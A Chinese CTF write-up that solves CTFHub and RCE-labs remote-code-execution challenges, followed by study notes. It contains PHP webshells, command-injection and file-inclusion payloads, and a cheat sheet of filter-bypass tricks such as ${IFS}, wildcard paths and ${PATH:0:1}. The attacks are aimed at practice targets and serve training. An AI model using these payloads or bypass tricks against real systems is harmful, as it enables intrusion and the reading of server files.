##  Ctfhub-RCE模块----命令注入  
### eval执行
打开靶机后 发现一段php代码

```python
 <?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?> 
```

#### 第一种解法
其中存在eval函数形式的一句话木马 所以我们可以尝试用中国蚁剑去连接 密码为cmd

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736862959274-26e06712-8ccd-4788-a21e-d296f66ae717.png)

连接着成功后添加数据 在数据的根目录下方发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736863012716-9990f434-a7ff-4bbb-8819-499fe589196b.png)

#### 第二种解法
利用eval可执行php语句的特性

```python
?cmd=system("ls /");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736918228662-9bf5ce4c-f1c1-487b-8dcc-f7b22e7bf263.png)

发现flag 接着利用cat读取flag

```python
?cmd=system("cat /flag_8908");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736918324022-479b5955-1de8-4fdb-b815-84e3480a4001.png)

### 文件包含
#### 第一种解法
打开靶机后发现一段php代码

```python
 <?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i have a <a href="shell.txt">shell</a>, how to use it ? i have a shell, how to use it ?
```

通过代码审计后 发现可以通过get方式上传参数 来利用文件包含漏洞 虽然不允许参数中出现flag字样 但是题目提示存在shell.txt文件 我们可以先尝试读取shell.txt文件

```python
?file=shell.txt
```

传参后页面发生跳转

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736863435118-3d2b106f-8ea8-469a-b952-93f563bb0c59.png)

我们发现shell是可以点击的  我们点击shell又发生页面跳转

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736863490604-9c31c083-cffe-41bb-8312-3cf67729eda5.png)

发现一句话木马可以尝试用中国蚁剑连接 不过连接地址为    密码为ctfhub

```python
靶机网址?file=shell.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736864271938-c479ecec-cb00-4b29-8863-62d5afa65299.png)

连接成功后添加数据   在根目录下发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736864206353-47bc6018-e548-4e92-8aa8-e764b0e10080.png)

#### 第二种解法
由于在shell.txt文件中存在一个变量ctfhub 并且不可以直接文件包含有关flag的文件 

我们可以利用shell.txt文件中的eval函数来写入执行命令从而寻找到flag 所以可以利用system函数执行命令

```python
?file=shell.txt
ctfhub=system("ls /");              //这个变量用post方式上传
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736864743781-17ddbb4d-6449-46b7-895f-23aad9cb17b6.png)

利用插件hackbar传参成功 发现flag 接着利用cat读取flag

```python
?file=shell.txt
ctfhub=system("cat /flag");              //这个变量用post方式上传
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736864826626-03a50938-3fd1-4c41-a107-a2407d12712c.png)

### php://input
打开靶机后出现一段php代码

```python
 <?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
<a href="phpinfo.php">phpinfo</a> i don't have shell, how to get flag?
phpinfo
```

<font style="color:rgb(77, 77, 77);">根据题目提示，可以查看phpinfo();的内容，结合题目的名称，查找php://input的相关设置：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736919550121-a0d89ac7-bda5-43f5-a716-03508356fa0f.png)

通过代码审计 如果上传文件名前六个是： <font style="color:#601BDE;">php://  </font><font style="color:#000000;">则执行文件包含函数</font>

<font style="color:#000000;">所以我们可以使用php://input来执行命令  使用burp来传递命令</font>

```python
<?php eval(system('ls /'));?>
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736919895629-61edae4f-357b-4ea9-9103-4dfc92af1fee.png)

查看响应包发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736919923468-ed8d08c0-c07e-4dac-af15-c46ee68e2f99.png)

接着使用cat来读取flag

```python
<?php eval(system('cat /flag_15478'));?>
```

发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736919993976-22188cff-7736-463b-a617-642447d89942.png)

### 读取源代码
打开靶机出现php代码

```python
 <?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
flag in <code>/flag</code> i don't have shell, how to get flag?
flag in /flag
```

通过代码审计可以 存在文件包含漏洞 只要参数file的前六位为php://则会执行文件包含

我们可以利用php://filter伪协议来读取flag 由于题目提示存贮flag的文件名就叫flag

```python
?file=php://filter/resource=/flag
```

发现没什么反应说明不在根目录下 于是我们可以一级一级的去寻找

```python
?file=php://filter/resource=/../flag
?file=php://filter/resource=/../../flag
?file=php://filter/resource=/../../../flag
```

在最后一个payload时出现了flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736920687352-ff7fb063-3a5b-4e57-a386-a89a3185f297.png)

### 远程包含
打开靶机后还是一段php代码

```python
 <?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag?<br>
<a href="phpinfo.php">phpinfo</a> i don't have shell, how to get flag?
phpinfo
```

通过代码审计上传参数file中不能出现flag 并且我们也不知道flag位于哪个文件 所以我们可以尝试使用php://input伪协议上传命令 还是利用burp

```python
<?php eval(system('ls /'));?>
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736921475449-b2dfb3f8-ece1-4ec0-b4d5-0a3dc4b3bf4e.png)

查看响应包发现flag文件

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736921509517-9ea3532a-5324-4122-ba72-da91b6e55406.png)

接着利用cat命令读取flag

```python
<?php eval(system('cat /flag'));?>
```

查看响应包得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736921623245-fd3fa3b0-5b2f-4c41-b959-1d4cc733b3cc.png)

### 命令注入
打开i靶机后发现存在一个ping窗口  和php代码

```python

CTFHub 命令注入-无过滤
IP :

<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-无过滤</title>
</head>
<body>

<h1>CTFHub 命令注入-无过滤</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>
```

通过代码审计 发现存在命令执行漏洞先随便ping个127.0.0.1查看是否有回显位置

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736922681115-a8d400c5-92f4-4aa7-8774-c9e4a898bb90.png)

存在回显位置 通过分号输入想要执行的命令 先输入ls /查看根目录下的文件

```python
?ip=127.0.0.1;ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736922802184-4c311947-b9c4-4e72-a0d4-8b39e0585686.png)

没有发现flag相关文件 查看下网址目录下的文件

```python
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736922889279-e215890a-1cb9-476c-999d-cb5c59224cde.png)

发现较为可疑的 298771494526771.php   尝试利用cat读取flag

```python
?ip=127.0.0.1;cat 298771494526771.php
```

 刚开始没看到flag 还以为命令有错 但是打开源代码发现了flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736923111276-d69f1141-507c-445a-9537-8115683f83db.png)

### 过滤cat
```python

CTFHub 命令注入-过滤cat
IP :

<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-过滤cat</title>
</head>
<body>

<h1>CTFHub 命令注入-过滤cat</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>
```

和上一题好像差不多  但是过滤了cat关键字 我们还是先寻找flag在的文件 先列出根目录下的文件

```python
?ip=127.0.0.1;ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736923786416-b2ed94c3-caaf-4930-a0d9-70dde8302f0f.png)

没有发现flag  接着查看网站目录下的文件

```python
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736923883896-bb641e26-12a8-4eb7-bd98-d4066b9bdc44.png)

发现flag文件 我们可以用head代替cat来读取flag 

```python
?ip=127.0.0.1;head flag_282401865310892.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736924481391-e03820cb-f67f-47e4-8eb8-6a7e68faed73.png)

此外除了head能替代cat以外常见的还有more less tail tac

### 过滤空格
```python
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-过滤空格</title>
</head>
<body>

<h1>CTFHub 命令注入-过滤空格</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>
```

和上一题差不多 但是这题过滤了空格 我们可以使用%09 ${IFS} $IFS$1 ${IFS}$1代替空格

还是先寻找flag所在文件的位置

```python
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736924904910-2da0cbb8-f43b-4764-828f-7db53e17dd0b.png)

发现flag

```python
?ip=127.0.0.1;cat$IFS$1flag_32182114630677.php
```

打开源代码后发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736925085805-25ffa0a0-8f73-4d11-85ca-6e4ca2c72400.png)

### 过滤目录分割符
和上一题差不多 不过目录分隔符被过滤了 我们还是先寻找flag所在文件位置

```python
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736926143146-07ef14fe-9b83-4e0f-be0e-37056a76b0e3.png)

提示flag位置的文件出现 接着查看

```python
?ip=127.0.0.1;ls flag_is_here
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736926205379-0ca7195b-f21a-4bd7-a147-296723101c6a.png)

发现flag文件在目录flag_is_here下面 由于目录分割符被过滤了 所以我们可以用以下符号来替代

```python
${PATH:0:1}
${HOME:0:1}
```

```python
?ip=127.0.0.1;cat flag_is_here${PATH:0:1}flag_106852122422196.php
```

打开源代码发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736926434832-df7e3941-8f18-41c4-bf70-1eabdb7570ca.png)

也可通过多条命令语句的执行来读取flag

```python
?ip=127.0.0.1;cd flag_is_here;cat flag_106852122422196.php
```

### 过滤运算符
```python
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||\&)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-过滤运算符</title>
</head>
<body>

<h1>CTFHub 命令注入-过滤运算符</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>
```

其中过滤了运算符 我们同样还是寻找flag文件的位置

```python
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736928572280-b9dd13b9-8226-43e0-94ea-2111903d937d.png)

发现flag文件 直接利用cat读取

```python
?ip=127.0.0.1;cat flag_600069243291.php
```

查看原代码后 发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736928660385-9707d1da-fdce-4ba9-a770-83c900b88881.png)

### **<font style="color:rgba(0, 0, 0, 0.85);">综合过滤练习</font>**
题目提示 <font style="color:#000000;">同时过滤了前面几个小节的内容</font>

```python

CTFHub 命令注入-综合练习
IP :

<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-综合练习</title>
</head>
<body>

<h1>CTFHub 命令注入-综合练习</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>
```

代码审计后发现过滤的东西挺多的   <font style="color:#601BDE;">!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)</font>

<font style="color:#000000;">分号和逻辑运算符被过滤了 所以我们用%0a来替代分号  先寻找flag位置</font>

```python
?ip=127.0.0.1%0als
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736929590304-919f04eb-9946-4806-aca3-a75869d6c3de.png)

接着查看flag_is_here文件 利用$IFS$1代替空格  利用通配符f*来代替flag_is_here

```python
?ip=127.0.0.1%0Als$IFS$1f*
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736929920585-63bb67ac-3339-480c-b526-591a8edab507.png)

发现flag文件 接着利用head代替cat来读取flag 目录分隔符用${PATH:0:1}来替代 flag继续使用通配符f*代替

```python
?ip=127.0.0.1%0Ahead$IFS$1f*${PATH:0:1}f*
```

查看源代码得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736930348141-cf610231-2c68-4d2b-af2f-798c17099409.png)

##  RCE-labs[0-8]题
### [RCE-labs]Level 0 -  代码执行&命令执行
![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736952038696-1c81cf10-d6b5-4768-9d4f-7750db99e638.png)

打开靶机就发现了flag

### [RCE-labs]Level 1 - 一句话木马和代码执行
```python
<?php 
include ("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 一句话木马和代码执行 --- 

「代码执行(Code Execution)」 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的`eval()`函数或Python中的`exec()`函数。

当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd')";); 也被归为代码执行漏洞。

我们平时最常见的一句话木马就用的 eval() 函数，如下所示（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）

try POST:
    a=echo "Hello,World!";
*/

eval($_POST['a']);

highlight_file(__FILE__);

?>
```

通过代码审计和题目提示 存在eval函数 可以进行恶意命令执行和一句话木马连接 所以有两种解法

#### 第一种解法
利用system函数进行恶意命令执行

```python
a=system('ls /');          //利用hackbar以post方式上传参数
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736952533877-65f95cad-160b-4d89-b5ba-3fcafdb37d88.png)

发现flag文件 cat来读取flag

```python
a=system('cat /flag'); 
```

发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736952632292-1509a4ab-cdad-4c65-92ba-24533f1fd7c0.png)

#### 第二种解法
由于代码中存在一句话木马 我们可以尝试利用中国蚁剑连接网站 连接密码为a

连接成功后添加数据 在根目录下发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736952825801-a403bd4f-1170-4802-a30c-acf64d121f38.png)

### [RCE-labs]Level 2 - PHP代码执行函数
打开靶机后出现一段较长的代码 定义了三个函数

```python
function get_fun(){

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    
    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);
    
    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}
```

通过代码审计后得知当get_fun函数被调用时 会随机返回list中的函数

```python
function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}
```

在helloctf函数中存在命令执行函数eval 并且参数code为传入参数function和参数content拼接而成  并且有题目提示可得知flag在全局变量$flag里面  所以我们只要构造变量$code来执行输出$flag即可

```python
function start($act){

    $random_func = get_fun();
    
    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }

    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}
isset($_GET['action']) ? start($_GET['action']) : '';
```

在start函数中调用了get_fun函数和hello_ctf函数  并且最后一句代码中调用了start函数 当以get方式上传参数action为r重置当前选中的函数 上传为submit可以接着以post方式上传参数content来作为随机生成函数的参数

```python
?action=submit
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736992806636-a7dc74c9-5ee2-456b-8d02-6a6f078d296c.png)

随机生成的函数是call_user_func() 于是我们接着上传参数content

```python
content=print($flag)
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736992918250-d9c23f0f-3f73-4abe-a42b-376d7bb9ae65.png)

### [RCE-labs]Level 3 - 命令执行
```python
<?php 
system($_POST['a']);

highlight_file(__FILE__);


?>
```

发现可以命令执行的system函数 先列出更目录下的文件

```python
a=ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736995486303-ce816766-06af-4077-b44e-2e1ce2f60479.png)

发现flag 于是利用cat读取flag

```python
a=cat /flag
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736995548217-9be721bb-4bb3-4e1d-adaf-3289e288bc8d.png)

### [RCE-labs]Level 4 - SHELL 运算符
```python
<?php
function hello_server($ip){
    system("ping -c 1 $ip");
}

isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);


?>
```

由于只能控制system函数里面的部分参数 所以要用分号或者逻辑运算符构建payload

```python
?ip=127.0.0.1;ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737001066107-84f73b0e-4f84-4e8d-9066-8b9c6b4d8635.png)

发现flag文件 利用cat读取flag

```python
?ip=127.0.0.1;cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737001128703-510ec67c-a1ca-4e56-870a-7239d1f23055.png)

得到flag

### [RCE-labs]Level 5 - 黑名单式过滤
```php
<?php 
  function hello_shell($cmd){
  if(preg_match("/flag/", $cmd)){
  die("WAF!");
  }
  system($cmd);
  }

  isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

通过代码审计发现存在命令执行函数 但是存在过滤参数中不能出现flag 先寻找flag所在位置 查看根目录下的文件

```php
?cmd=ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737001480151-655f3029-7439-4bd7-8c5a-1808713a73df.png)

发现flag文件 接着利用cat读取flag由于存在过滤 所以使用通配符f*代替flag

```php
?cmd=cat /f*
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737001559915-79d02db6-f0e8-4405-aefd-9be49b5bed7b.png)

### [RCE-labs]Level 6 - 通配符匹配绕过
```php
<?php
function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

被过滤的要如下符号    能用的只有目录分隔符和字母a

```php
b-zA-Z：匹配所有小写和大写英文字母。
_：匹配下划线字符。
@：匹配@符号。
#：匹配井号字符。
%：匹配百分号字符。
^：匹配脱字符。
&：匹配与符号。
*：匹配星号字符。
:：匹配冒号字符。
{}：匹配大括号。
[]：匹配方括号。
\：匹配反斜杠字符。
+：匹配加号字符。
<>：匹配小于号和大于号。
"：匹配双引号字符。
|：匹配竖线字符。
`：匹配反引号字符。
;：匹配分号字符
```

可以尝试在Linux终端中做下面的几个实验，使用echo方法输出?匹配的字符串

```php
echo /???/???
echo /???/?a?
echo /???/?a??64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737016607219-03c4c61a-6804-4030-97c7-194caff3eeba.png)

所以可以利用 /bin/cat /flag 或者 /bin/base64 /flag 去寻找flag 有payload

```php
?cmd=/???/?a? /??a?                  //payload1
?cmd=/???/?a??64 /??a?                //payload2
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737016892197-acd3e3a4-ce26-4e60-8451-c7f1a111ac5d.png)

payload2

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737016987340-b679c4d2-14b1-4f1e-81ee-ab965c0829de.png)

解密后得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737017023297-e2b52022-aa87-4ca0-99ad-caa1f518007e.png)

### [RCE-labs]Level 7 - 空格过滤
```php
<?php
function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

通过代码审计发现过滤掉了flag 和空格 我们可以使用通配符来代替flag %09 $IFS$1 ${IFS} 来代替空格

```php
?cmd=ls%09/
?cmd=cat%09/f???
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737017463577-b16330ce-f83c-4865-a73a-ed0c00ee78f8.png)

### [RCE-labs]Level 8 - 文件描述和重定向
```php
<?php
function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

题目提示不会有任何的回显 所以我们要想得到信息就得进行外带  可以利用管道符加tee进行文件外带

```php
?cmd=ls /|tee 1.txt
```

接着访问1.txt

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737017849891-43b8f41a-e3a5-4d4e-b797-deb96e4d58fd.png)

发现flag文件接着外带到1.txt中

```php
?cmd=cat /flag|tee 1.txt
```

访问1.txt得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737017908540-75271e2c-a4de-4262-aa8e-353c37437f6d.png)

## 利用wsl搭建linux环境过程
参考文章[链接](https://blog.csdn.net/lyh13239510484/article/details/136372701?ops_request_misc=%257B%2522request%255Fid%2522%253A%25220a8607ac81796bcbff91e48626e431be%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=0a8607ac81796bcbff91e48626e431be&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-136372701-null-null.142^v101^pc_search_result_base1&utm_term=%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BAlinux%E7%8E%AF%E5%A2%83wsl&spm=1018.2226.3001.4187)

<font style="color:rgb(77, 77, 77);">（1）按下Win+R ，输入 powershell </font><font style="color:rgb(77, 77, 77);">然后按下Enter键   进入到如下页面</font>

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737020038725-1aa19522-6a65-4c4b-9ce8-c9f6732b0d07.png)

（2）输入

```php
wsl --install
```

安装ubuntu

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737020671959-4cf4ffd9-1311-4535-9769-70384c705999.png)

接着设置用户名和密码即可

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737021018340-83d6479e-7f04-46a5-a9d8-7ea7f0a99bbe.png)

要使用时搜索ubuntu即可

## ![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737021091219-99331d13-0c1a-43ec-a8fa-139267e317e3.png)学习笔记
### RCE命令执行的知识小结
#### 过滤关键字，如过滤 cat，flag等关键字
##### 代替法
```php
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2>%261 //报错出文件内容
```

##### 使用转义符号
```php
ca\t /fl\ag
cat fl''ag
```

##### 拼接法
```php
a=fl;b=ag;cat$IFS$a$b
```

##### 反引号绕过
```php
`ls`  `cat`
```

#### 空格绕过
```php
> < <> 重定向符
%20(space)
%09(tab)
$IFS$9
${IFS}（最好用这个）
$IFS  
%0a  换行符
{cat,flag.txt} 在大括号中逗号可起分隔作用
```

#### 简单符号绕过正则
##### 单双引号法
```php
ca''t flag.txt
ca""t flag.txt
```

因为单双引号中并没有字符，相当于在其中没有添加任何字符，命令意思不变

##### 跨行符'\'绕过
跨行符的意思为接着上一行的内容，转到下一行接着输入命令，上下行均是一条命令

```php
ca\t       l\s
```

#### 通配符绕过正则
通配符可以代替任何字符

shell通配符有

```php
* ：表示通配字符0次及以上
? : 表示通配字符0或
```

##### 可以通配得到的命令
###### base64
```python
/bin/base64 可以通配为：
 
/???/????64
 
作用为将文件以base64编码形式输出
```

###### bzip2
```python
/usr/bin/bzip2 可以通配为：
 
/???/???/????2
 
作用为将文件压缩成后缀为bz2的压缩文件
flag.php ==>  flag.php.bz2
```

###### cat
```python
/bin/cat/ 可以通配为：
/???/?a?/
```

##### 字符串通配
```python
flag.php ==> flag.???
             flag*
             ……
```

当然可以用通配符去通配一些命令，但不能全名称通配

```python
例如：
/bin/ca?
相当于cat命令
```

#### <font style="color:rgb(79, 79, 79);">变量拼接绕过正则</font>
可以在shell语句里定义变量，将被过滤的字符串分成部分绕过

```python
以flag.php为例:
 
x=lag;cat f$x.php
 
相当于:
 
cat flag.php
```

#### 内联执行
内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果

可用于内联语句的符号you ${},``（反引号）

例如:

```python
echo `ls`
 
echo ${ls}
 
相当于把ls的结果使用echo输出
```

#### **<font style="color:rgb(77, 77, 77);">过滤目录分割符</font>**
```python
采用多管道命令绕过
127.0.0.1||cd flag_is_here;cat flag_262431433226364.php
```

或者用以下符号来替代

```python
${PATH:0:1}
${HOME:0:1}
```

#### 过滤分割符 | & ；
```python
  ;  //分号
  |  //只执行后面那条命令
  ||  //只执行前面那条命令
  &  //两条命令都会执行
  &&  //两条命令都会执行
  %0a      //换行符
  %0d     //回车符号
  
  用?>代替；
  在php中可以用?>来代替最后的一个；，因为php遇到定界符关闭标签会自动在末尾加上一个分号。
```



### md5的知识小结
参考文章：[链接](https://blog.csdn.net/weixin_37730482/article/details/70258547?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226089B332-44EF-4773-94E0-5B2F2AE68ADD%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6089B332-44EF-4773-94E0-5B2F2AE68ADD&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-70258547-null-null.142^v100^pc_search_result_base7&utm_term=md5%E7%AE%80%E4%BB%8B&spm=1018.2226.3001.4187) [链接](https://blog.csdn.net/qq_45290991/article/details/120400363?ops_request_misc=%257B%2522request%255Fid%2522%253A%252271EC1266-17C8-4610-9FAA-0B6DB465740C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=71EC1266-17C8-4610-9FAA-0B6DB465740C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120400363-null-null.142^v100^pc_search_result_base7&utm_term=%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&spm=1018.2226.3001.4187)

#### 1、md5简介及特点
MD5英文全称“Message-Digest Algorithm 5”，翻译过来是“消息摘要算法5”，由MD2、MD3、MD4演变过来的，是一种单向加密算法，是不可逆的一种的加密方式。

特点：

```php
压缩性：任意长度的数据，算出的MD5值长度都是固定的。

容易计算：从原数据计算出MD5值很容易。

抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。

